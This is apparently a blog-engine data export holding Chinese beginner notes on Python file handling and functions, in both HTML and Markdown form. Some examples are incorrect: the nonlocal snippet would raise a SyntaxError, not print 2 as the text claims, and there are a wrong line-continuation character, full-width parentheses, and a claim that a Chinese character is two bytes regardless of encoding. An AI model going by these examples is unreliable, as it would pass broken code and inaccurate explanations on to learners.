写读。会先新建/清空文件，因此并不能读到之前文件的内容，只能读到后面写入的。</li>\n<li><code>a+</code> —&gt; 追加读。所有写的内容只能追加在文件最后。</li>\n<li>文件操作模式后可以加<code>b</code>，表示以二进制方式操作文件。</li>\n</ul>\n</li>\n<li>前面两个参数必须是字符串类型。</li>\n<li>第三个参数：控制输出缓存。0表示无缓存，即写入的内容直接输出给硬盘等外部；其他数字表示缓存区满后再输出到外部文件。</li>\n<li>第四个参数：可以设置文件的编码。</li>\n</ul>\n</blockquote>\n<h4 id=\"文件位置\"><a href=\"#文件位置\" class=\"headerlink\" title=\"文件位置\"></a>文件位置</h4><ul>\n<li>文件对象会有一个文件位置，可以想象为指针/光标，指示着文件当前所处的状态，刚创建的文件对象，偏移量默认为0。</li>\n<li>偏移量的单位为字节，一个汉字两个字节。</li>\n<li>tell()：查看文件当前位置（偏移量）。</li>\n<li>seek()：改变文件位置到指定偏移量并返回偏移量。</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">f.seek(<span class=\"number\">2</span>)   <span class=\"comment\">#改变文件的光标到第二个字节处</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"读文件\"><a href=\"#读文件\" class=\"headerlink\" title=\"读文件\"></a>读文件</h4><ul>\n<li>读操作永远从文件位置开始。</li>\n<li>read()、readline、readlines()都是先将整个文件读到内存当中，若文件很大时，占用大量内存且速度慢。</li>\n<li>而从文件当中获取内容的最好方法是根本不读取，使用for循坏文件对象。for循环会每次只读取一行到内存，且内存每次只存在一行。</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> line <span class=\"keyword\">in</span> f:</span><br><span class=\"line\">    print(line)</span><br></pre></td></tr></table></figure>\n<h5 id=\"read-将文件内容读为一个字符串\"><a href=\"#read-将文件内容读为一个字符串\" class=\"headerlink\" title=\"read() #将文件内容读为一个字符串\"></a>read() #将文件内容读为一个字符串</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">f.read()    <span class=\"comment\">#读取文件光标后的所有内容</span></span><br><span class=\"line\">f.read(<span class=\"number\">2</span>)   <span class=\"comment\">#读取文件位置后的2个字符</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>读取的开始位置是当前文件的位置。</li>\n<li>读取的内容会作为单一字符串。</li>\n<li>读取后，文件的位置（光标）也会相应移动。</li>\n<li>单位是字符个数，而不是字节。</li>\n</ul>\n<h5 id=\"readline-读取一行为一个字符串\"><a href=\"#readline-读取一行为一个字符串\" class=\"headerlink\" title=\"readline() #读取一行为一个字符串\"></a>readline() #读取一行为一个字符串</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">f.readline()    <span class=\"comment\">#读取光标位置到行末</span></span><br><span class=\"line\">f.readline(<span class=\"number\">3</span>)   <span class=\"comment\">#等同于f.read(3)</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>读取的开始位置是当前文件的位置。</li>\n<li>读取的结束是该行的结束，即出现换行符</li>\n<li>读取后，文件的位置（光标）也会相应移动</li>\n</ul>\n<h5 id=\"readlines-读取文件的每一行到一个字符串列表\"><a href=\"#readlines-读取文件的每一行到一个字符串列表\" class=\"headerlink\" title=\"readlines() #读取文件的每一行到一个字符串列表\"></a>readlines() #读取文件的每一行到一个字符串列表</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">f.readlines()    <span class=\"comment\">#读取光标位置到行末为一个字符串并作为列表的一个元素</span></span><br><span class=\"line\">f.readlines(<span class=\"number\">3</span>)   <span class=\"comment\">#读取一行到列表中</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"写文件\"><a href=\"#写文件\" class=\"headerlink\" title=\"写文件\"></a>写文件</h4><ul>\n<li>w操作使用seek()到指定位置插入时会将原位置的内容覆盖。</li>\n<li>a操作使用seek()没有用，都只会追加在最后。</li>\n<li>特别注意：写入时，光标也在不断后移。</li>\n</ul>\n<h5 id=\"write-写入字符串\"><a href=\"#write-写入字符串\" class=\"headerlink\" title=\"write() #写入字符串\"></a>write() #写入字符串</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">f.write(<span class=\"string\">'abc'</span>)                             <span class=\"comment\">#写入字节字符串并返回写入的字符数</span></span><br><span class=\"line\">f.write(bytes(<span class=\"string\">'abc'</span>,encoding=<span class=\"string\">'utf-8'</span>))     <span class=\"comment\">#写入二进制字符串</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>当操作模式加了b时，写入只能写入二进制内容。</li>\n</ul>\n<h5 id=\"writelines-将字符串列表内容写入文件\"><a href=\"#writelines-将字符串列表内容写入文件\" class=\"headerlink\" title=\"writelines() #将字符串列表内容写入文件\"></a>writelines() #将字符串列表内容写入文件</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">list=[<span class=\"string\">'this'</span>,<span class=\"string\">'is'</span>,<span class=\"string\">'aString'</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">f.writelines(list)</span><br></pre></td></tr></table></figure>\n<ul>\n<li>列表储存的只能是字符串对象</li>\n</ul>\n<h4 id=\"修改文件\"><a href=\"#修改文件\" class=\"headerlink\" title=\"修改文件\"></a>修改文件</h4><ul>\n<li>所有写操作都不能做到，在文件的内容之间插入内容。修改文件的两个方法：一是全部读到内存修改；二是新建一个文件。</li>\n<li>读到内存修改：如VIM等编辑器就是这种方式，整个文件读到内存，在内存修改后再写回文件中。文件大时肯定效率低。</li>\n<li>新建文件方式修改文件：</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#将文件中存在'b'的这行改为'B'</span></span><br><span class=\"line\"><span class=\"keyword\">with</span> open(<span class=\"string\">'old.txt'</span>) <span class=\"keyword\">as</span> old,/</span><br><span class=\"line\">    open(<span class=\"string\">'new.txt'</span>,<span class=\"string\">'w'</span>) <span class=\"keyword\">as</span> new:</span><br><span class=\"line\">    <span class=\"keyword\">for</span> line <span class=\"keyword\">in</span> old:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> line==<span class=\"string\">'b\\n'</span>:</span><br><span class=\"line\">            line=<span class=\"string\">'B\\n'</span></span><br><span class=\"line\">        new.write(line)</span><br></pre></td></tr></table></figure>\n<h4 id=\"关闭文件\"><a href=\"#关闭文件\" class=\"headerlink\" title=\"关闭文件\"></a>关闭文件</h4><ul>\n<li>当文件对象不再被引用时也会自动关闭，即f引用其他对象。</li>\n</ul>\n<h5 id=\"f-close\"><a href=\"#f-close\" class=\"headerlink\" title=\"f.close()\"></a>f.close()</h5><h5 id=\"f-flush-将内存输出缓冲区内容刷入硬盘，但不关闭文件\"><a href=\"#f-flush-将内存输出缓冲区内容刷入硬盘，但不关闭文件\" class=\"headerlink\" title=\"f.flush() #将内存输出缓冲区内容刷入硬盘，但不关闭文件\"></a>f.flush() #将内存输出缓冲区内容刷入硬盘，但不关闭文件</h5><ul>\n<li>写入文件的内容可能不会立即写入硬盘当中，而是存在内存的输出缓存区中。</li>\n<li>flush()和close()都能刷新缓冲区</li>\n</ul>"},{"title":"Python基础学习系列Chapter 7：函数","date":"2019-03-29T07:19:43.000Z","_content":"\n#### 0x00 函数概述\n\n- def是可执行语句，即运行def语句后，函数才会存在于内存。\n- def创建一个函数对象并将其赋值给某一变量名（函数名）。该变量是函数对象的一个引用。\n- return语句会将一个结果对象返回给调用者，没有return语句默认返回NONE。也表示函数的调用结束。\n- lambda可以创建函数并自动将结果返回。（def需要用return返回）\n- yield语句也会将结果返回调用函数者，并且会记住它离开的地方。\n- global语句用于声明一个模块级的变量。\n- 参数是通过对象引用赋值传递的。\n\n<!-- more -->\n\n#### 0x01 def 函数定义\n\n```python\ndef <name>(arg1,arg2,arg3.....)\n    <statements>\n```\n\n- def是实时运行的，运行def语句后才会创建函数对象（封装函数代码并将这个对象赋值给变量名）。 因此运行了def后（运行模块、导入模块等），才能调用函数。(注：调用不能在定义之前，因为Python不像C等语言，有先全部编译的过程，Python的语句都是实时运行的）\n- def语句定义的函数名是对象引用赋值，函数名是指向函数对象所在内存的一个引用而已。\n- def语句在运行时才会评估（执行），而函数的主体内容在函数调用时才会评估（执行）。\n- 可以有0个或以上个参数，称为形参\n- function_name（）——函数名加上（args....）表示函数的调用，每调用一次就会运行函数主体代码。\n\n#### 0x02 return 函数返回值\n\n```python\nreturn 1\nreturn 1，'a',{'b':2},[1,2,3]，x+y\n```\n\n- return是可选的，没有时默认返回none\n- 可以返回任意类型的值，但只能返回表达式，而不能是语句。返回多个值时，这些值将被放入一个元组中。\n\n#### 0x03 变量作用域（LEGB法则）\n\n- 作用域（命名空间） 即能访问到该变量的范围；变量赋值的位置决定了它所在的命名空间。\n- Python创建、查找、修改变量名都是在命名空间进行的。不同命名空间的同名变量名不会冲突。\n- 函数定义本地作用域，模块定义全局作用域。\n- 变量的作用域由赋值的位置决定，分为三种作用域：\n\n> 对于每个def内的，叫本地作用域。\n>\n> 函数嵌套了函数，那么对于被嵌套函数而言，嵌套函数的变量是非本地的（nonlocal）。\n>\n> 在def外的（包括函数名），叫全局作用域。\n\n- 全局作用域的作用范围仅限于单个文件（模块），导入模块会得到被导入模块的全局变量访问权。\n- 只有对变量赋值才会产生本地变量。如对列表进行索引修改、执行append（）等的这种原处修改的对象不会产生本地变量。\n- 默认情况下：\n  - 每一个函数内的变量（赋值操作）、形参、被此函数嵌套的函数名、函数内import 模块名都是属于此函数的本地作用域。      \n  - 通过 global 【scope】声明变量为全局变量。\n\n```python\na=1\ndef fun1():\n    a=2\n    def fun2():\n    \tglobal a\n    \tprint (a)\n    fun2()    \t\t\n\n#调用函数fun1后，打印的值是1，因为声明了a为全局变量。\n```\n\n- 通过 nonlocal 【scope】声明变量为非本地变量。\n\n```python\na=1   #全局变量\ndef fun1():\n   a=2 #本地变量\n   def fun2():#fun1下的a对于fun2为非本地变量。\n        a=5 #本地变量\n    \tnonlocal a\n    \tprint (a)\n   fun2()\n\n#调用函数fun1后，打印的值是2，因为声明了a为非本地变量。\n    \n```\n\n- 变量名查找法则（LEGB/LNGB)：\n\n```\nL：首先先查找本地作用域。\nE/N：若有嵌套，（被嵌套函数）其次查找嵌套函数的作用域（即嵌套函数的本地作用域）\nG：再次，查找全局作用域。\nB：最后查找内置作用域。\n\n依次按顺序查找，不可逆向查找。\n查找到第一个结果后不再继续查找，会将第一个查找结果作为结果。\n```\n\n- 每一次函数的调用都会产生一个新的作用域。（这点对去理解函数递归很重要）\n- 函数执行完毕后，本次函数调用产生的本地作用域也将消失，意味着变量将消失，但是变量的状态会被记住。\n\n```python\n#闭包（Closure）是词法闭包（Lexical Closure）的简称，是引用了自由变量的函数。这个被引用的自由变量将和这个函数一同存在，即使已经离开了创造它的环境也不例外。\n\n#闭包/工厂函数：一个能记住嵌套作用域变量值的函数，尽管那个作用域或许已经不存在。\n\ndef make(x):\n    def act(y):\n        return x*y\n    return act\nf1=make(2)\nf2=make(4)\n\nf1(2) #返回4，f1记住了x=2的这个状态\nf2(2) #返回8，f2记住了x=4的这个状态\n```\n\n- 除了上面的闭包，可以让Python函数保存状态的方法还有：共享全局变量、参数使用默认值。最好的方法是OOP。\n\n```python\n# 参数使用默认值\ndef make(x):\n    def act(y,x=x):\n        return x*y\n    return act\n#效果等同于闭包，该方法适用于全部Python版本\n```\n\n\n\n#### 0x04 参数\n\n- 参数是通过引用赋值的，被传递的参数从来不自动拷贝。\n- 赋值的变量，即形参，是属于本地作用域的。\n- 因为是引用赋值传递，因此在函数内对传入的可变对象参数进行修改，会对其他引用影响。\n- 通常情况下，参数通过位置从左到右赋值传递给形参，传递的参数要与形参数量对应。也可以使用name=value的关键字传参赋值方法。位置参数必须在关键字参数之前。\n- 可以为形参指定默认值。\n- 实参与形参传递规则：         \n  - 通过位置分配非关键字参数。    \n\n```\n通过匹配变量名（形参名）分配关键字参数。\n\n其他没有分配的非关键字参数分配到 *args的元组中。\n\n其他没有匹配的关键字参数分配到**args的字典中。\n\n没有分配到参数的形参使用默认值参数。\n```\n\n- *与 **：\n\n```\n*、**在实参前表示对传递的参数对象进行解包。\t\n\t*的参数对象必须为序列，**的为参数对象必须为字典。\n\t \n*、**在形参前表示让形参接收所有没有匹配其他形参的参数。\n\t *将接收的参数放入一个元组。\n\t **将接受的关键字赋值参数放入一个字典。\n```\n\n- 定义函数时使用 * ，则它之后的形参在函数调用时都必须使用关键字赋值。（keyword-only）\n\n```python\ndef fun1（a,*b,c,d,e）:\n\tpass\n\nfun1（1,2,c=3,d=4,e=5） # *之后的必须用关键字赋值\n```\n\n- 定义函数时使用**的形参位置必须是最后一个。\n- 事实上。*对所有可迭代对象有用。\n- name=value在调用中表示关键字参数；name=value在函数定义中表示默认值。\n\n#### 0x05 匿名函数 lambda\n\n- 是def外，另一种生成函数对象的方式。\n- lambda是表达式而不是语句，因此可以用于def不能用于的地方。\n- lambda主体是表达式，而不是代码块，意味着只能写于一行。\n- lambda同样遵循LEGB法则，因此也支持闭包。\n- 默认会返回结果。\n\n##### 0x06 函数定义\n\n```python\nlambda <arg1,arg2...> : expression\n\nf = lambda x,y : x+y\n\nf(1,2) #返回3\n(lambda x,y:x+y)(1,2) #返回3\n```\n\n- lambda会创建并返回一个函数对象。\n- lambda也可以使用默认参数。","source":"_posts/06python基础学习系列之函数.md","raw":"---\ntitle: Python基础学习系列Chapter 7：函数\ndate: 2019-03-29 15:19:43\ntags:\n\t- Python基础\n\t- Language\ncategories: Python\n---\n\n#### 0x00 函数概述\n\n- def是可执行语句，即运行def语句后，函数才会存在于内存。\n- def创建一个函数对象并将其赋值给某一变量名（函数名）。该变量是函数对象的一个引用。\n- return语句会将一个结果对象返回给调用者，没有return语句默认返回NONE。也表示函数的调用结束。\n- lambda可以创建函数并自动将结果返回。（def需要用return返回）\n- yield语句也会将结果返回调用函数者，并且会记住它离开的地方。\n- global语句用于声明一个模块级的变量。\n- 参数是通过对象引用赋值传递的。\n\n<!-- more -->\n\n#### 0x01 def 函数定义\n\n```python\ndef <name>(arg1,arg2,arg3.....)\n    <statements>\n```\n\n- def是实时运行的，运行def语句后才会创建函数对象（封装函数代码并将这个对象赋值给变量名）。 因此运行了def后（运行模块、导入模块等），才能调用函数。(注：调用不能在定义之前，因为Python不像C等语言，有先全部编译的过程，Python的语句都是实时运行的）\n- def语句定义的函数名是对象引用赋值，函数名是指向函数对象所在内存的一个引用而已。\n- def语句在运行时才会评估（执行），而函数的主体内容在函数调用时才会评估（执行）。\n- 可以有0个或以上个参数，称为形参\n- function_name（）——函数名加上（args....）表示函数的调用，每调用一次就会运行函数主体代码。\n\n#### 0x02 return 函数返回值\n\n```python\nreturn 1\nreturn 1，'a',{'b':2},[1,2,3]，x+y\n```\n\n- return是可选的，没有时默认返回none\n- 可以返回任意类型的值，但只能返回表达式，而不能是语句。返回多个值时，这些值将被放入一个元组中。\n\n#### 0x03 变量作用域（LEGB法则）\n\n- 作用域（命名空间） 即能访问到该变量的范围；变量赋值的位置决定了它所在的命名空间。\n- Python创建、查找、修改变量名都是在命名空间进行的。不同命名空间的同名变量名不会冲突。\n- 函数定义本地作用域，模块定义全局作用域。\n- 变量的作用域由赋值的位置决定，分为三种作用域：\n\n> 对于每个def内的，叫本地作用域。\n>\n> 函数嵌套了函数，那么对于被嵌套函数而言，嵌套函数的变量是非本地的（nonlocal）。\n>\n> 在def外的（包括函数名），叫全局作用域。\n\n- 全局作用域的作用范围仅限于单个文件（模块），导入模块会得到被导入模块的全局变量访问权。\n- 只有对变量赋值才会产生本地变量。如对列表进行索引修改、执行append（）等的这种原处修改的对象不会产生本地变量。\n- 默认情况下：\n  - 每一个函数内的变量（赋值操作）、形参、被此函数嵌套的函数名、函数内import 模块名都是属于此函数的本地作用域。      \n  - 通过 global 【scope】声明变量为全局变量。\n\n```python\na=1\ndef fun1():\n    a=2\n    def fun2():\n    \tglobal a\n    \tprint (a)\n    fun2()    \t\t\n\n#调用函数fun1后，打印的值是1，因为声明了a为全局变量。\n```\n\n- 通过 nonlocal 【scope】声明变量为非本地变量。\n\n```python\na=1   #全局变量\ndef fun1():\n   a=2 #本地变量\n   def fun2():#fun1下的a对于fun2为非本地变量。\n        a=5 #本地变量\n    \tnonlocal a\n    \tprint (a)\n   fun2()\n\n#调用函数fun1后，打印的值是2，因为声明了a为非本地变量。\n    \n```\n\n- 变量名查找法则（LEGB/LNGB)：\n\n```\nL：首先先查找本地作用域。\nE/N：若有嵌套，（被嵌套函数）其次查找嵌套函数的作用域（即嵌套函数的本地作用域）\nG：再次，查找全局作用域。\nB：最后查找内置作用域。\n\n依次按顺序查找，不可逆向查找。\n查找到第一个结果后不再继续查找，会将第一个查找结果作为结果。\n```\n\n- 每一次函数的调用都会产生一个新的作用域。（这点对去理解函数递归很重要）\n- 函数执行完毕后，本次函数调用产生的本地作用域也将消失，意味着变量将消失，但是变量的状态会被记住。\n\n```python\n#闭包（Closure）是词法闭包（Lexical Closure）的简称，是引用了自由变量的函数。这个被引用的自由变量将和这个函数一同存在，即使已经离开了创造它的环境也不例外。\n\n#闭包/工厂函数：一个能记住嵌套作用域变量值的函数，尽管那个作用域或许已经不存在。\n\ndef make(x):\n    def act(y):\n        return x*y\n    return act\nf1=make(2)\nf2=make(4)\n\nf1(2) #返回4，f1记住了x=2的这个状态\nf2(2) #返回8，f2记住了x=4的这个状态\n```\n\n- 除了上面的闭包，可以让Python函数保存状态的方法还有：共享全局变量、参数使用默认值。最好的方法是OOP。\n\n```python\n# 参数使用默认值\ndef make(x):\n    def act(y,x=x):\n        return x*y\n    return act\n#效果等同于闭包，该方法适用于全部Python版本\n```\n\n\n\n#### 0x04 参数\n\n- 参数是通过引用赋值的，被传递的参数从来不自动拷贝。\n- 赋值的变量，即形参，是属于本地作用域的。\n- 因为是引用赋值传递，因此在函数内对传入的可变对象参数进行修改，会对其他引用影响。\n- 通常情况下，参数通过位置从左到右赋值传递给形参，传递的参数要与形参数量对应。也可以使用name=value的关键字传参赋值方法。位置参数必须在关键字参数之前。\n- 可以为形参指定默认值。\n- 实参与形参传递规则：         \n  - 通过位置分配非关键字参数。    \n\n```\n通过匹配变量名（形参名）分配关键字参数。\n\n其他没有分配的非关键字参数分配到 *args的元组中。\n\n其他没有匹配的关键字参数分配到**args的字典中。\n\n没有分配到参数的形参使用默认值参数。\n```\n\n- *与 **：\n\n```\n*、**在实参前表示对传递的参数对象进行解包。\t\n\t*的参数对象必须为序列，**的为参数对象必须为字典。\n\t \n*、**在形参前表示让形参接收所有没有匹配其他形参的参数。\n\t *将接收的参数放入一个元组。\n\t **将接受的关键字赋值参数放入一个字典。\n```\n\n- 定义函数时使用 * ，则它之后的形参在函数调用时都必须使用关键字赋值。（keyword-only）\n\n```python\ndef fun1（a,*b,c,d,e）:\n\tpass\n\nfun1（1,2,c=3,d=4,e=5） # *之后的必须用关键字赋值\n```\n\n- 定义函数时使用**的形参位置必须是最后一个。\n- 事实上。*对所有可迭代对象有用。\n- name=value在调用中表示关键字参数；name=value在函数定义中表示默认值。\n\n#### 0x05 匿名函数 lambda\n\n- 是def外，另一种生成函数对象的方式。\n- lambda是表达式而不是语句，因此可以用于def不能用于的地方。\n- lambda主体是表达式，而不是代码块，意味着只能写于一行。\n- lambda同样遵循LEGB法则，因此也支持闭包。\n- 默认会返回结果。\n\n##### 0x06 函数定义\n\n```python\nlambda <arg1,arg2...> : expression\n\nf = lambda x,y : x+y\n\nf(1,2) #返回3\n(lambda x,y:x+y)(1,2) #返回3\n```\n\n- lambda会创建并返回一个函数对象。\n- lambda也可以使用默认参数。","slug":"06python基础学习系列之函数","published":1,"updated":"2019-03-29T07:46:14.671Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjuam83k600167or0265v4u83","content":"<h4 id=\"0x00-函数概述\"><a href=\"#0x00-函数概述\" class=\"headerlink\" title=\"0x00 函数概述\"></a>0x00 函数概述</h4><ul>\n<li>def是可执行语句，即运行def语句后，函数才会存在于内存。</li>\n<li>def创建一个函数对象并将其赋值给某一变量名（函数名）。该变量是函数对象的一个引用。</li>\n<li>return语句会将一个结果对象返回给调用者，没有return语句默认返回NONE。也表示函数的调用结束。</li>\n<li>lambda可以创建函数并自动将结果返回。（def需要用return返回）</li>\n<li>yield语句也会将结果返回调用函数者，并且会记住它离开的地方。</li>\n<li>global语句用于声明一个模块级的变量。</li>\n<li>参数是通过对象引用赋值传递的。</li>\n</ul>\n<a id=\"more\"></a>\n<h4 id=\"0x01-def-函数定义\"><a href=\"#0x01-def-函数定义\" class=\"headerlink\" title=\"0x01 def 函数定义\"></a>0x01 def 函数定义</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> &lt;<span class=\"title\">name</span>&gt;<span class=\"params\">(arg1,arg2,arg3.....)</span></span></span><br><span class=\"line\"><span class=\"function\">    &lt;<span class=\"title\">statements</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>def是实时运行的，运行def语句后才会创建函数对象（封装函数代码并将这个对象赋值给变量名）。 因此运行了def后（运行模块、导入模块等），才能调用函数。(注：调用不能在定义之前，因为Python不像C等语言，有先全部编译的过程，Python的语句都是实时运行的）</li>\n<li>def语句定义的函数名是对象引用赋值，函数名是指向函数对象所在内存的一个引用而已。</li>\n<li>def语句在运行时才会评估（执行），而函数的主体内容在函数调用时才会评估（执行）。</li>\n<li>可以有0个或以上个参数，称为形参</li>\n<li>function_name（）——函数名加上（args….）表示函数的调用，每调用一次就会运行函数主体代码。</li>\n</ul>\n<h4 id=\"0x02-return-函数返回值\"><a href=\"#0x02-return-函数返回值\" class=\"headerlink\" title=\"0x02 return 函数返回值\"></a>0x02 return 函数返回值</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"number\">1</span>，<span class=\"string\">'a'</span>,&#123;<span class=\"string\">'b'</span>:<span class=\"number\">2</span>&#125;,[<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>]，x+y</span><br></pre></td></tr></table></figure>\n<ul>\n<li>return是可选的，没有时默认返回none</li>\n<li>可以返回任意类型的值，但只能返回表达式，而不能是语句。返回多个值时，这些值将被放入一个元组中。</li>\n</ul>\n<h4 id=\"0x03-变量作用域（LEGB法则）\"><a href=\"#0x03-变量作用域（LEGB法则）\" class=\"headerlink\" title=\"0x03 变量作用域（LEGB法则）\"></a>0x03 变量作用域（LEGB法则）</h4><ul>\n<li>作用域（命名空间） 即能访问到该变量的范围；变量赋值的位置决定了它所在的命名空间。</li>\n<li>Python创建、查找、修改变量名都是在命名空间进行的。不同命名空间的同名变量名不会冲突。</li>\n<li>函数定义本地作用域，模块定义全局作用域。</li>\n<li>变量的作用域由赋值的位置决定，分为三种作用域：</li>\n</ul>\n<blockquote>\n<p>对于每个def内的，叫本地作用域。</p>\n<p>函数嵌套了函数，那么对于被嵌套函数而言，嵌套函数的变量是非本地的（nonlocal）。</p>\n<p>在def外的（包括函数名），叫全局作用域。</p>\n</blockquote>\n<ul>\n<li>全局作用域的作用范围仅限于单个文件（模块），导入模块会得到被导入模块的全局变量访问权。</li>\n<li>只有对变量赋值才会产生本地变量。如对列表进行索引修改、执行append（）等的这种原处修改的对象不会产生本地变量。</li>\n<li>默认情况下：<ul>\n<li>每一个函数内的变量（赋值操作）、形参、被此函数嵌套的函数名、函数内import 模块名都是属于此函数的本地作用域。      </li>\n<li>通过 global 【scope】声明变量为全局变量。</li>\n</ul>\n</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a=<span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">fun1</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    a=<span class=\"number\">2</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">fun2</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    \t<span class=\"keyword\">global</span> a</span><br><span class=\"line\">    \t<span class=\"keyword\">print</span> (a)</span><br><span class=\"line\">    fun2()    \t\t</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#调用函数fun1后，打印的值是1，因为声明了a为全局变量。</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>通过 nonlocal 【scope】声明变量为非本地变量。</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a=<span class=\"number\">1</span>   <span class=\"comment\">#全局变量</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">fun1</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">   a=<span class=\"number\">2</span> <span class=\"comment\">#本地变量</span></span><br><span class=\"line\">   <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">fun2</span><span class=\"params\">()</span>:</span><span class=\"comment\">#fun1下的a对于fun2为非本地变量。</span></span><br><span class=\"line\">        a=<span class=\"number\">5</span> <span class=\"comment\">#本地变量</span></span><br><span class=\"line\">    \t<span class=\"keyword\">nonlocal</span> a</span><br><span class=\"line\">    \t<span class=\"keyword\">print</span> (a)</span><br><span class=\"line\">   fun2()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#调用函数fun1后，打印的值是2，因为声明了a为非本地变量。</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>变量名查找法则（LEGB/LNGB)：</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">L：首先先查找本地作用域。</span><br><span class=\"line\">E/N：若有嵌套，（被嵌套函数）其次查找嵌套函数的作用域（即嵌套函数的本地作用域）</span><br><span class=\"line\">G：再次，查找全局作用域。</span><br><span class=\"line\">B：最后查找内置作用域。</span><br><span class=\"line\"></span><br><span class=\"line\">依次按顺序查找，不可逆向查找。</span><br><span class=\"line\">查找到第一个结果后不再继续查找，会将第一个查找结果作为结果。</span><br></pre></td></tr></table></figure>\n<ul>\n<li>每一次函数的调用都会产生一个新的作用域。（这点对去理解函数递归很重要）</li>\n<li>函数执行完毕后，本次函数调用产生的本地作用域也将消失，意味着变量将消失，但是变量的状态会被记住。</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#闭包（Closure）是词法闭包（Lexical Closure）的简称，是引用了自由变量的函数。这个被引用的自由变量将和这个函数一同存在，即使已经离开了创造它的环境也不例外。</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#闭包/工厂函数：一个能记住嵌套作用域变量值的函数，尽管那个作用域或许已经不存在。</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">make</span><span class=\"params\">(x)</span>:</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">act</span><span class=\"params\">(y)</span>:</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> x*y</span><br><span class=\"line\">    <span class=\"keyword\">return</span> act</span><br><span class=\"line\">f1=make(<span class=\"number\">2</span>)</span><br><span class=\"line\">f2=make(<span class=\"number\">4</span>)</span><br><span 